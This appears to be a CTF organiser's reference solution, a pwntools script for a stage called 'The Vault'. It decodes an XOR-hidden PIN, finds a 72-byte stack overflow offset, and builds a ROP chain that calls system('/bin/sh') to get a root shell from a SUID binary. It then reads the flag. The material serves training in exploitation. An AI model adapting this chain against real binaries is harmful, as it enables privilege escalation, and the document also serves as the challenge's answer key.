#!/usr/bin/env python3
"""
Stage 06 | The Vault — ROP Chain Reference Solution
=====================================================
Author : CTF Builder (for internal reference only — do not distribute to players)

Prerequisites:
  Stage 06 container is running and pwntools is installed there.
  Transfer this script from the host to /home/analyst on the Stage 06 server
  (see Official_Walkthrough.md), then run it there beside vault.elf.

Step 1 — Reverse the XOR PIN:
  GDB:
    gdb ./vault.elf
    (gdb) break main
    (gdb) run
    (gdb) x/4xb &ENC_PIN
    → 0x73  0x71  0x71  0x75
    Each ^ 0x42 = 0x31 0x33 0x33 0x37 = "1337"

  Python quick-decode:
    python3 -c "print(''.join(chr(b^0x42) for b in [0x73,0x71,0x71,0x75]))"
    → 1337

Step 2 — Find the buffer overflow offset:
  python3 -c "from pwn import *; print(cyclic(200))" | ./vault.elf
    Enter Security PIN: 1337
    Enter master passphrase: <cyclic pattern>
    → SIGSEGV with overwritten RIP
  (gdb) x/gx $rsp   → read value, then: cyclic_find(<value>)
  Expected offset: 72  (buf[64] + saved_rbp[8])

Step 3 — Find ROP gadgets:
  ROPgadget --binary vault.elf --rop | grep "pop rdi"
    → 0x<addr>: pop rdi ; ret
  ROPgadget --binary vault.elf --rop | grep ": ret$"
    → 0x<addr>: ret            (needed for 16-byte stack alignment)

Step 4 — Find /bin/sh and system@plt:
  objdump -s -j .data vault.elf | grep -A1 "/bin"
    → address of SHELL_PATH[] = "/bin/sh"
  objdump -d vault.elf | grep "<system"
    → address of system@plt

Step 5 — Run this script inside the Stage 06 container:
  python3 solve.py
"""

from pwn import *

# ── Target binary ────────────────────────────────────────────────────────
BINARY = './vault.elf'
elf    = ELF(BINARY)
context.binary = elf
context.log_level = 'info'

# ── Auto-find gadget addresses using pwntools ────────────────────────────
rop = ROP(elf)

pop_rdi   = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_align = rop.find_gadget(['ret'])[0]
binsh_ptr = next(elf.search(b'/bin/sh'))
system    = elf.plt['system']

log.info(f"pop rdi gadget : {hex(pop_rdi)}")
log.info(f"ret  gadget    : {hex(ret_align)}")
log.info(f"/bin/sh addr   : {hex(binsh_ptr)}")
log.info(f"system@plt     : {hex(system)}")

# ── Build ROP chain ──────────────────────────────────────────────────────
OFFSET  = 72                  # 64-byte buffer + 8-byte saved_rbp

payload  = b'A' * OFFSET
payload += p64(pop_rdi)       # gadget: pop rdi ; ret
payload += p64(binsh_ptr)     # rdi = pointer to "/bin/sh"
payload += p64(ret_align)     # align stack to 16 bytes (required by system())
payload += p64(system)        # call system("/bin/sh")

log.success(f"Payload length: {len(payload)} bytes")

# ── Exploit ──────────────────────────────────────────────────────────────
# Run the SUID binary inside the Stage 06 container.
p = process(BINARY)

# Bypass Part 1: XOR PIN
p.sendlineafter(b'PIN  : ', b'1337')

# Part 2: Send ROP payload through gets() overflow
p.sendlineafter(b'passphrase: ', payload)

log.success("ROP chain triggered — dropping to shell...")

print("""
\033[1;37m      . ~ ~ ~ ~ ~ ~ ~ ~ ~ .       \033[0m
\033[1;37m    (   ~   ~   ~   ~   ~   )     \033[0m
\033[1;37m   (  ~   ~   ~   ~   ~   ~  )    \033[0m
\033[1;33m   |                         |    \033[0m
\033[1;33m   |                         |--. \033[0m
\033[1;33m   |                         |  | \033[0m
\033[1;33m   |                         |  | \033[0m
\033[1;33m   |                         |--' \033[0m
\033[1;33m   |                         |    \033[0m
\033[1;33m   \\                         /    \033[0m
\033[1;33m    `-----------------------'     \033[0m
\033[1;32m      CHEERS! ROOT SHELL SECURED! \033[0m
""")

p.interactive()

# ── Shell commands to capture flag ───────────────────────────────────────
# Once in root shell:
#   id
#   cat /root/vault_flag.txt
